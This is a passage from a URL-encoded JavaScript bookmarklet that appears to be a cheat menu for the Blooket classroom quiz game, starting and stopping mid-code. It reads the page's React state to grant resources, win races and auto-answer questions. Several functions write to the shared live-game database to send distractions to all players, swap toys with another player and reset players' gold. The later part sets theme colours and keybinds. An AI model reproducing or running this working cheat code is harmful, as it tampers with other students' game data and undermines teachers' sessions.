await%20new%20Promise(e=%3EsetTimeout(e,4e3));alert(%60Reset%20$%7Br%7D%20players'%20gold!%60)%7D)%7D%7D%5D,kingdom:%5B%7Bname:%22Choice%20ESP%22,description:%22Shows%20you%20what%20will%20happen%20if%20you%20say%20Yes%20or%20No%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bif(this.enabled)this.enabled=!1,clearInterval(this.data),Array.from(document.getElementsByClassName(%22choiceESP%22)).forEach(e=%3Ee.remove()),this.data=null;else%7Bthis.enabled=!0;let%20o=%5B%22materials%22,%22people%22,%22happiness%22,%22gold%22%5D,a=Object.fromEntries(%5B...document.querySelectorAll(%22%5Bclass%5E=styles__statContainer%5D%22)%5D.map((e,t)=%3E%5Bo%5Bt%5D,e%5D));this.data=setInterval(()=%3E%7Bvar%7Bguest:e,phase:t%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state;%22choice%22==t&&(Array.from(document.getElementsByClassName(%22choiceESP%22)).forEach(e=%3Ee.remove()),Object.entries(e.yes%7C%7C%7B%7D).forEach(e=%3E%7Bvar%20t;%22msg%22!=e%5B0%5D&&o.includes(e%5B0%5D)&&((t=document.createElement(%22div%22)).className=%22choiceESP%22,t.style=%22font-size:%2024px;%20color:%20rgb(75,%20194,%2046);%20font-weight:%20bolder;%22,t.innerText=String(e%5B1%5D),a%5Be%5B0%5D%5D.appendChild(t))%7D),Object.entries(e.no%7C%7C%7B%7D).forEach(e=%3E%7Bvar%20t;%22msg%22!=e%5B0%5D&&o.includes(e%5B0%5D)&&((t=document.createElement(%22div%22)).className=%22choiceESP%22,t.style=%22font-size:%2024px;%20color:%20darkred;%20font-weight:%20bolder;%22,t.innerText=String(e%5B1%5D),a%5Be%5B0%5D%5D.appendChild(t))%7D))%7D,50)%7D%7D%7D,%7Bname:%22Disable%20Tax%20Toucan%22,description:%22Tax%20evasion%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.taxCounter=Number.MAX_VALUE%7D%7D,%7Bname:%22Max%20Stats%22,description:%22Sets%20all%20resources%20to%20the%20max%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bmaterials:100,people:100,happiness:100,gold:100%7D)%7D%7D,%7Bname:%22Set%20Guests%22,description:%22Sets%20the%20amount%20of%20guests%20you've%20seen%22,inputs:%5B%7Bname:%22Guests%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7BguestScore:e%7D)%7D%7D,%7Bname:%22Skip%20Guest%22,description:%22Skips%20the%20current%20guest%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.nextGuest()%7D%7D%5D,racing:%5B%7Bname:%22Instant%20Win%22,description:%22Instantly%20Wins%20the%20race%22,run:function()%7Bconst%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.setState(%7Bprogress:e.state.goalAmount%7D,()=%3E%7Bconst%7Bquestion:o%7D=e%5B%22state%22%5D;try%7B%5B...document.querySelectorAll('%5Bclass*=%22answerContainer%22%5D')%5D%5Bo.answers.map((e,t)=%3Eo.correctAnswers.includes(e)?t:null).filter(e=%3Enull!=e)%5B0%5D%5D?.click?.()%7Dcatch%7B%7D%7D)%7D%7D%5D,royale:%5B%7Bname:%22Auto%20Answer%20(Toggle)%22,description:%22Toggles%20auto%20answer%20on%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e?.onAnswer?.(!0,e.props.client.question.correctAnswers%5B0%5D)%7D,50))%7D%7D,%7Bname:%22Auto%20Answer%22,description:%22Chooses%20the%20correct%20answer%20for%20you%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e?.onAnswer?.(!0,e.props.client.question.correctAnswers%5B0%5D)%7D%7D%5D,rush:%5B%7Bname:%22Set%20Blooks%22,description:%22Sets%20amount%20of%20blooks%20you%20or%20your%20team%20has%22,inputs:%5B%7Bname:%22Blooks%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7BnumBlooks:e%7D),t.isTeam?t.props.liveGameController.setVal(%7Bpath:%60a/$%7Bt.props.client.name%7D/bs%60,val:e%7D):t.props.liveGameController.setVal(%7Bpath:%60c/$%7Bt.props.client.name%7D/bs%60,val:numDefense%7D)%7D%7D,%7Bname:%22Set%20Defense%22,description:%22Sets%20amount%20of%20defense%20you%20or%20your%20team%20has%20(Max%204)%22,inputs:%5B%7Bname:%22Defense%20(max%204)%22,type:%22number%22,max:4%7D%5D,run:function(e)%7Bvar%20e=Math.min(e,4),t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7BnumDefense:e%7D),t.isTeam?t.props.liveGameController.setVal(%7Bpath:%60a/$%7Bt.props.client.name%7D/d%60,val:e%7D):t.props.liveGameController.setVal(%7Bpath:%60c/$%7Bt.props.client.name%7D/d%60,val:e%7D)%7D%7D%5D,workshop:%5B%7Bname:%22Remove%20Distractions%22,description:%22Removes%20all%20enemy%20distractions%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bfog:!1,dusk:!1,wind:!1,plow:!1,blizzard:!1,force:!1,canada:!1,trees:%5B!1,!1,!1,!1,!1,!1,!1,!1,!1,!1%5D%7D)%7D%7D,%7Bname:%22Send%20Distraction%22,description:%22Sends%20a%20distraction%20to%20everyone%20else%20playing%22,inputs:%5B%7Bname:%22Distraction%22,type:%22options%22,options:Object.entries(%7Bc:%22Oh%20Canada%22,b:%22Blizzard%22,f:%22Fog%20Spell%22,d:%22Dark%20&%20Dusk%22,w:%22Howling%20Wind%22,g:%22Gift%20Time!%22,t:%22TREES%22,s:%22Snow%20Plow%22,fr:%22Use%20The%20Force%22%7D).map((%5Be,t%5D)=%3E(%7Bname:t,value:e%7D))%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.safe=!0,t.props.liveGameController.setVal(%7Bpath:%60c/$%7Bt.props.client.name%7D/tat%60,val:e%7D)%7D%7D,%7Bname:%22Set%20Toys%22,description:%22Sets%20amount%20of%20toys%22,inputs:%5B%7Bname:%22Toys%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7Btoys:e%7D),t.props.liveGameController.setVal(%7Bpath:%22c/%22.concat(t.props.client.name),val:%7Bb:t.props.client.blook,t:e%7D%7D)%7D%7D,%7Bname:%22Set%20Toys%20Per%20Question%22,description:%22Sets%20amount%20of%20toys%20per%20question%22,inputs:%5B%7Bname:%22Toys%20Per%20Question%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7BtoysPerQ:e%7D)%7D%7D,%7Bname:%22Swap%20Toys%22,description:%22Swaps%20toys%20with%20someone%22,inputs:%5B%7Bname:%22Player%22,type:%22options%22,options:()=%3E%7Blet%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;return%20new%20Promise(t=%3Ee.props.liveGameController._liveApp?e.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(Object.keys(e))):t(%5B%5D))%7D%7D%5D,run:function(o)%7Blet%20a=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;a.props.liveGameController.getDatabaseVal(%22c%22,e=%3E%7Bvar%20t;e&&Object.keys(e).map(e=%3Ee.toLowerCase()).includes(o.toLowerCase())&&(%5Be,%7Bt%7D%5D=Object.entries(e).find((%5Be%5D)=%3Ee.toLowerCase()==o.toLowerCase()),a.props.liveGameController.setVal(%7Bpath:%22c/%22.concat(a.props.client.name),val:%7Bb:a.props.client.blook,t:t,tat:e+%22:swap:%22+a.state.toys%7D%7D),a.setState(%7Btoys:t%7D))%7D)%7D%7D%5D,settings:%5B%7Bname:%22Import%20Settings%22,description:%22Import%20a%20custom%20theme%22,inputs:%5B%7Bname:%22JSON%20Data%22,type:%22string%22%7D%5D,run:function(e)%7Btry%7BJSON.parse(e)%7Dcatch(e)%7Breturn%20alert(%22Invalid%20JSON%20provided%22)%7De=%7BbackgroundColor:%22rgb(11,%20194,%20207)%22,infoColor:%22#9a49aa%22,cheatList:%22#9a49aa%22,defaultButton:%22#9a49aa%22,disabledButton:%22#A02626%22,enabledButton:%22#47A547%22,textColor:%22white%22,inputColor:%22#7a039d%22,contentBackground:%22rgb(64,%2017,%2095)%22,...JSON.parse(e)%7D,d.setItem(%22theme%22,e);for(const%20t%20in%20e)u.sheet.cssRules%5B0%5D.style.setProperty(%22--%22+t,e%5Bt%5D)%7D%7D,%7Bname:%22Export%20Settings%22,description:%22Export%20the%20current%20theme%20to%20JSON%22,run:async%20function()%7Bawait%20navigator.clipboard.writeText(JSON.stringify(d.data.theme,null,4)),prompt(%22Text%20copied%20to%20clipboard.%20(Paste%20below%20to%20test)%22)%7D%7D,%7Bname:%22Defaults%22,description:%22Changes%20all%20the%20settings%20to%20a%20preset%22,inputs:%5B%7Bname:%22Theme%22,type:%22options%22,options:%5B%7Bname:%22Default%22,value:%7BbackgroundColor:%22rgb(11,%20194,%20207)%22,infoColor:%22#9a49aa%22,cheatList:%22#9a49aa%22,defaultButton:%22#9a49aa%22,disabledButton:%22#A02626%22,enabledButton:%22#47A547%22,textColor:%22white%22,inputColor:%22#7a039d%22,contentBackground:%22rgb(64,%2017,%2095)%22%7D%7D,%7Bname:%22Blacket%22,value:%7BbackgroundColor:%22#4f4f4f%22,infoColor:%22#2f2f2f%22,cheatList:%22#2f2f2f%22,defaultButton:%22#4f4f4f%22,disabledButton:%22#eb6234%22,enabledButton:%22#00c20c%22,textColor:%22white%22,inputColor:%22#3f3f3f%22,contentBackground:%22#2f2f2f%22%7D%7D,%7Bname:%22Skool.lol%22,value:%7BbackgroundColor:%22linear-gradient(90deg,%20rgba(104,45,140,1)%20220px,%20rgba(237,30,121,1)%20100%25)%22,cheatList:%22#1e2124%22,infoColor:%22#1e2124%22,defaultButton:%22#36393e%22,inputColor:%22#1e2124%22,enabledButton:%22#9c9a9a%22,textColor:%22white%22,disabledButton:%22#171717%22,contentBackground:%22#292929%22%7D%7D,%7Bname:%22Blue%20-%20Purple%20Background%22,value:%7BbackgroundColor:%22linear-gradient(162.5deg,%20rgba(0,183,255,1)%20220px,%20rgba(128,0,255,1)%20100%25)%22%7D%7D,%7Bname:%22Saint%20Patricks%20Background%22,value:%7BbackgroundColor:%22rgb(9,%20148,%2065)%22%7D%7D,%7Bname:%22Halloween%20Background%22,value:%7BbackgroundColor:%22rgb(41,%2041,%2041)%22%7D%7D,%7Bname:%22Fall%20Background%22,value:%7BbackgroundColor:%22rgb(224,%20159,%2062)%22%7D%7D,%7Bname:%22Winter%20Background%22,value:%7BbackgroundColor:%22linear-gradient(rgb(49,%20170,%20224),%20rgb(187,%20221,%20255))%22%7D%7D,%7Bname:%22Crypto%20Hack%22,value:%7BbackgroundColor:%22radial-gradient(#11581e,#041607)%22,infoColor:%22#1a1a1a%22,cheatList:%22#1a1a1a%22,defaultButton:%22rgb(88%20175%2088)%22,disabledButton:%22#A02626%22,enabledButton:%22#0b601b%22,textColor:%22white%22,inputColor:%22rgb(0%200%200%20/%2025%25)%22,contentBackground:%22#11581e%22%7D%7D,%7Bname:%22Fishing%20Frenzy%22,value:%7BbackgroundColor:%22linear-gradient(180deg,#9be2fe%200,#67d1fb)%22,infoColor:%22#c8591e%22,cheatList:%22#c8591e%22,defaultButton:%22#ff751a%22,disabledButton:%22#bf0e0e%22,enabledButton:%22#2fb62f%22,textColor:%22white%22,inputColor:%22rgb(0%200%200%20/%2025%25)%22,contentBackground:%22radial-gradient(#02b0ea%2040%25,%20#1d86ea)%22%7D%7D,%7Bname:%22Deceptive%20Dinos%22,value:%7BbackgroundColor:'radial-gradient(rgba(220,%20184,%2086,%200),%20rgba(220,%20184,%2086,%200.4)),%20url(%22https://ac.blooket.com/play/111cb7e0ee6607ac3d1a13d534c0e0f1.png%22),%20#ead49a',infoColor:%22#af8942%22,cheatList:%22#af8942%22,defaultButton:%22#af8942%22,disabledButton:%22#A02626%22,enabledButton:%22#47A547%22,textColor:%22white%22,inputColor:%22rgb(0%200%200%20/%2010%25)%22,contentBackground:%22radial-gradient(rgba(1,104,162,.6),rgba(24,55,110,.5)),radial-gradient(#2783b4%201.5px,#18376e%200)%20center%20/%2024px%2024px%22%7D%7D,%7Bname:%22Blook%20Rush%22,value:%7BbackgroundColor:%22repeating-linear-gradient(45deg,white,white%208%25,#e6e6e6%200,#e6e6e6%2016%25)%22,defaultButton:%22#36c%22,inputColor:%22rgb(0%200%200%20/%2025%25)%22,infoColor:%22#36c%22,cheatList:%22#36c%22,contentBackground:%22#888%22,textColor:%22white%22,disabledButton:%22#A02626%22,enabledButton:%22#47A547%22%7D%7D,%7Bname:%22Factory%22,value:%7BdefaultButton:%22#1563bf%22,infoColor:%22#a5aabe%22,cheatList:%22#a5aabe%22,contentBackground:%22#2d313d%22,backgroundColor:%22#3a3a3a%22,enabledButton:%22rgb(75,%20194,%2046)%22,disabledButton:%22#9a49aa%22,inputColor:%22rgb(0%200%200%20/%2025%25)%22,textColor:%22white%22%7D%7D,%7Bname:%22Cafe%22,value:%7BbackgroundColor:%22linear-gradient(90deg,rgba(200,0,0,.5)%2050%25,transparent%200)%20center%20/%2050px%2050px,linear-gradient(rgba(200,0,0,0.5)%2050%25,transparent%200)%20white%20center%20/%2050px%2050px%22,defaultButton:%22#0bc2cf%22,inputColor:%22rgb(0%200%200%20/%2025%25)%22,infoColor:%22#ac7339%22,cheatList:%22#ac7339%22,contentBackground:%22rgb(64,%2064,%2064)%22,textColor:%22white%22,disabledButton:%22#A02626%22,enabledButton:%22#47A547%22%7D%7D,%7Bname:%22Tower%20of%20Doom%22,value:%7BbackgroundColor:%22rgb(41%2041%2041)%22,disabledButton:%22rgb(151,%2015,%205)%22,defaultButton:%22#333%22,inputColor:%22rgb(0%200%200%20/%2025%25)%22,contentBackground:%22#404040%22,enabledButton:%22#4bc22e%22,textColor:%22white%22,infoColor:%22#9a49aa%22,cheatList:%22#9a49aa%22%7D%7D,%7Bname:%22Monster%20Brawl%22,value:%7BdefaultButton:%22rgb(45,%2051,%2067)%22,backgroundColor:%22rgb(78,%2095,%20124)%22,inputColor:%22rgb(0%200%200%20/%2025%25)%22,contentBackground:%22linear-gradient(0deg,#374154,#4f5b74)%22,infoColor:%22#374154%22,cheatList:%22#374154%22,textColor:%22white%22,enabledButton:%22#47A547%22,disabledButton:%22#A02626%22%7D%7D,%7Bname:%22Tower%20Defense%202%22,value:%7BbackgroundColor:%22url(https://media.blooket.com/image/upload/v1676164454/Media/defense/backgroundTd1-02.svg)%20center%20/%20cover%22,cheatList:%22#a33c22%22,infoColor:%22#a33c22%22,defaultButton:%22#40b1d8%22,inputColor:%22#3e8cbe%22,contentBackground:%22#293c82%22,enabledButton:%22#47A547%22,disabledButton:%22#A02626%22,textColor:%22white%22%7D%7D%5D%7D%5D,run:function(e)%7Bd.setItem(%22theme%22,%7B...d.data.theme,...e%7D);for(const%20t%20in%20e)u.sheet.cssRules%5B0%5D.style.setProperty(%22--%22+t,e%5Bt%5D)%7D%7D,%7Bname:%22Scale%22,description:%22Forces%20the%20GUI%20to%20scale%20from%2025%25-100%25%22,inputs:%5B%7Btype:%22number%22,name:%22Percent%20scale%22,min:25,max:100,value:100*(d.data.scale%7C%7C1)%7D%5D,run:function(e)%7Be=Math.min(Math.max(e,25),100),d.setItem(%22scale%22,e/100),k.style.transform=%60scale($%7Be/100%7D)%60%7D%7D,%7Bname:%22Hide%20Keybind%22,description:%22Change%20the%20hide%20keybind%20(Click%20button%20after%20input%20to%20change)%22,inputs:%5B%7Btype:%22function%22,name:%22Input%22,function:r=%3ET((%7Bshift:e,ctrl:t,alt:o,key:a%7D)=%3Er(%22%22+%5Bt&&%22Ctrl%22,e&&%22Shift%22,o&&%22Alt%22,a&&a.toUpperCase()%5D.filter(Boolean).join(%22%20+%20%22)))%7D%5D,run:function(e)%7Bd.setItem(%22hide%22,e),h.update(d.data.hide%7C%7C%7Bctrl:!0,key:%22e%22%7D,d.data.close%7C%7C%7Bctrl:!0,key:%22x%22%7D)%7D%7D,%7Bname:%22Close%20Keybind%22,description:%22Change%20the%20quick%20close%20keybind%20(Click%20button%20after%20input%20to%20change)%22,inputs:%5B%7Btype:%22function%22,name:%22Input%22,function:r=%3ET((%7Bshift:e,ctrl:t,alt:o,key:a%7D)=%3Er(%22%22+%5Bt&&%22Ctrl%22,e&&%22Shift%22,o&&%22Alt%22,a&&a.toUpperCase()%5D.filter(Boolean).join(%22%20+%20%22)))%7D%5D,run:function(e)%7Bd.setItem(%22close%22,e),h.update(d.data.hide%7C%7C%7Bctrl:!0,key:%22e%22%7D,d.data.close%7C%7C%7Bctrl:!0,key:%22x%22%7D)%7D%7D,%7Bname:%22Background%20Color%22,description:%22Changes%20the%20background%20color%20of%20the%20GUI%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--backgroundColor%22,e),d.setItem(%22theme.backgroundColor%22,e)%7D%7D,%7Bname:%22Category%20List%20Color%22,description:%22Changes%20the%20categories%20list%20background%20color%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--cheatList%22,e),d.setItem(%22theme.cheatList%22,e)%7D%7D,%7Bname:%22Info%20Color%22,description:%22Changes%20the%20color%20of%20the%20information%20at%20the%20top%20of%20the%20GUI%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--infoColor%22,e),d.setItem(%22theme.infoColor%22,e)%7D%7D,%7Bname:%22Button%20Color%22,description:%22Changes%20the%20color%20of%20the%20cheats%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--defaultButton%22,e),d.setItem(%22theme.defaultButton%22,e)%7D%7D,%7Bname:%22Enabled%20Toggle%20Color%22,description:%22Changes%20the%20color%20of%20enabled%20toggle%20cheats%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bd.setItem(%22theme.enabledButton%22,e)%7D%7D,%7Bname:%22Disabled%20Toggle%20Color%22,description:%22Changes%20the%20color%20of%20disabled%20toggle%20cheats%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--disabledButton%22,e),d.setItem(%22theme.disabledButton%22,e)%7D%7D,%7Bname:%22Text%20Color%22,description:%22Changes%20the%20text%20color%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--textColor%22,e),d.setItem(%22theme.textColor%22,e)%7D%7D,%7Bname:%22Input%20Color%22,description:%22Changes%20the%20color%20of%20inputs,%20like%20the%20set%20gold%20number%20input%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--inputColor%22,e),d.setItem(%22theme.inputColor%22,e)%7D%7D,%7Bname:%22Content%20Color%22,description:%22Changes%20the%20background%20color%20of%20the%20cheats%22,inputs:%5B%7Btype:%22string%22,name:%22Color%22%7D%5D,run:function(e)%7Bu.sheet.cssRules%5B0%5D.style.setProperty(%22--contentBackground%22,e),d.setItem(%22theme.contentBackground%22,e)%7D%7D%5D,alerts:%5B%7Belement:v(%22div%22,%7BclassName:%22alertContainer%22,style:%7Bmargin:%2215px%2015px%205px%2015px%22,backgroundColor:%22rgb(0%200%200%20/%2050%25)%22,width:%2295%25%22,height:%22370px%22,borderRadius:%227px%22,display:%22block%22,alignItems:%22center%22,justifyContent:%22center%22%7D%7D,v(%22ul%22,%7BclassName:%22alertList%22,style:%7Bmargin:%2210px%2010px%200%2010px%22,padding:%220%22,listStyleType:%22none%22,display:%22flex%22,flexDirection:%22column-reverse%22,height:%22355px%22,overflowY:%22scroll%22,wordWrap:%22break-word%22%7D%7D,v(%22li%22,%7Bstyle:%7Bmargin:%225px%22%7D%7D,v(%22span%22,%7Bstyle:%7Bcolor:%22var(--textColor)%22%7D,innerText:%22%5BLOG%5D%20GUI%20opened%22%7D)))),addLog(e,t)%7Breturn%20this.element.firstChild.prepend(v(%22li%22,%7Bstyle:%7Bmargin:%225px%22%7D%7D,v(%22span%22,%7Bstyle:%7Bcolor:t%7C%7C%22var(--textColor)%22%7D,innerHTML:%22%5BLOG%5D%20%22+e%7D)))%7D,addAlert(e,t,o)%7Breturn%20this.element.firstChild.prepend(v(%22li%22,%7Bstyle:%7Bmargin:%225px%22%7D%7D,v(%22img%22,%7Bsrc:t%7C%7Cthis.blookData?.Black?.url,alt:%22blook%22,draggable:!1,style:%7Bheight:%2222.5px%22,margin:%220%2010px%20-5px%200%22%7D%7D),v(%22strong%22,%7B%7D,e),%22%20%22,o))%7D,connection:null,data:%7B%7D,updateLeaderboard(e)%7Bthis.leaderboardEl%7C%7Cthis.addLeaderboard(),this.leaderboard.innerHTML=%22%22;for(var%7Bblook:t,name:o,value:a%7Dof%20e)this.leaderboard.append(v(%22li%22,%7Bstyle:%7BfontSize:%222rem%22,paddingInline:%2272px%2015px%22,paddingBlock:%221.25px%22,position:%22relative%22%7D%7D,v(%22img%22,%7Bsrc:this.blookData?.%5Bt%5D?.url%7C%7Cthis.blookData.Black.url,alt:t,draggable:!1,style:%7Bheight:%2245px%22,position:%22absolute%22,left:%2215px%22%7D%7D),o,v(%22span%22,%7BinnerText:this.parseNumber(parseInt(a)),style:%7Bfloat:%22right%22%7D%7D)))%7D,parseNumber(a=0)%7Bvar%20r=a;if(a%3C1e3)return%20r.toString();var%20e=%5B%22%22,%22K%22,%22M%22,%22B%22,%22T%22%5D,o=Math.floor((a.toString().length-1)/3);if(o%3Ce.length)%7Blet%20t=0;for(let%20e=3;1%3C=e&&!((t=parseFloat((0!==o?a/Math.pow(1e3,o):a).toPrecision(e))).toString().replace(/%5B%5Ea-zA-Z%200-9%5D+/g,%22%22).length%3C=3);e--);r=(t=t%251!=0?t.toFixed(1):t)+e%5Bo%5D%7Delse%7Blet%20e=a,t=0;for(;100%3C=e;t++)e=Math.floor(e/10);let%20o=%22%22;var%20n=%5B%22%E2%81%B0%22,%22%C2%B9%22,%22%C2%B2%22,%22%C2%B3%22,%22%E2%81%B4%22,%22%E2%81%B5%22,%22%E2%81%B6%22,%22%E2%81%B7%22,%22%E2%81%B8%22,%22%E2%81%B9%22%5D;for(const%20i%20of(t+1).toString().split(%22%22))o+=n%5BNumber(i)%5D;r=e/10+%22%20%C3%97%2010%22+o%7Dreturn%20r%7D,addLeaderboard()%7Bthis.blookData%7C%7C=Object.values(webpackJsonp.push(%5B%5B%5D,%7B%22%22:(e,t,o)=%3E%7Bt.cache=o.c%7D%7D,%5B%5B%22%22%5D%5D%5D).cache).find(e=%3Ee.exports?.a?.Alice&&e.exports?.a?.Alien).exports.a,this.element.append(this.leaderboardEl=v(%22div%22,%7Bid:%22leaderboardContent%22,style:%7Bposition:%22absolute%22,inset:%22110%25%200px%22%7D%7D,v(%22div%22,%7Bstyle:%7BalignItems:%22center%22,boxSizing:%22border-box%22,display:%22flex%22,flexDirection:%22row%22,flexWrap:%22wrap%22,justifyContent:%22space-evenly%22,padding:%2220px%205px%2020px%22,position:%22relative%22,width:%22100%25%22,fontFamily:%22Nunito,%20sans-serif%22,fontWeight:%22400%22,color:%22var(--textColor)%22,background:%22var(--contentBackground)%22,boxShadow:%22inset%200%20-6px%20rgb(0%200%200%20/%2020%25)%22,borderRadius:%227px%22%7D%7D,v(%22div%22,%7BclassName:%22headerText%22,style:%7BboxSizing:%22border-box%22,display:%22block%22,height:%2245px%22,left:%22-10px%22,padding:%224px%204px%208px%22,position:%22absolute%22,top:%22-28px%22,backgroundColor:%22#ef7426%22,boxShadow:%220%204px%20rgb(0%200%200%20/%2020%25),%20inset%200%20-4px%20rgb(0%200%200%20/%2020%25)%22,borderRadius:%227px%22%7D%7D,v(%22div%22,%7Bstyle:%7BalignItems:%22center%22,boxSizing:%22border-box%22,display:%22flex%22,height:%22100%25%22,justifyContent:%22center%22,padding:%220%2015px%22,width:%22100%25%22,fontFamily:%22Titan%20One,%20sans-serif%22,fontSize:%2226px%22,fontWeight:%22400%22,textShadow:%22-1px%20-1px%200%20#646464,%201px%20-1px%200%20#646464,%20-1px%201px%200%20#646464,%202px%202px%200%20#646464%22,color:%22white%22,background:%22linear-gradient(#fcd843,#fcd843%2050%25,#feb31a%2050.01%25,#feb31a)%22,borderRadius:%225px%22%7D,innerText:%22Leaderboard%22%7D)),v(%22div%22,%7BclassName:%22alertContainer%22,style:%7Bmargin:%2215px%2015px%205px%2015px%22,backgroundColor:%22rgb(0%200%200%20/%2050%25)%22,width:%2295%25%22,height:%22370px%22,borderRadius:%227px%22,display:%22flex%22,alignItems:%22center%22,justifyContent:%22center%22%7D%7D,this.leaderboard=v(%22nl%22,%7BclassName:%22alertList%22,style:%7BmarginTop:%2210px%22,padding:%220%22,listStyleType:%22decimal%22,width:%22100%25%22,height:%22355px%22,overflowY:%22scroll%22,wordWrap:%22break-word%22%7D%7D)))))%7D,async%20connect()%7Btry%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;if(!e?.props?.liveGameController?._liveGameCode)return!1;this.connection=await%20e.props.liveGameController.getDatabaseRef(%22c%22);const%20f=this.blookData=Object.values(webpackJsonp.push(%5B%5B%5D,%7B%22%22:(e,t,o)=%3E%7Bt.cache=o.c%7D%7D,%5B%5B%22%22%5D%5D%5D).cache).find(e=%3Ee.exports?.a?.Alice&&e.exports?.a?.Alien).exports.a,k=this.getGamemode(),j=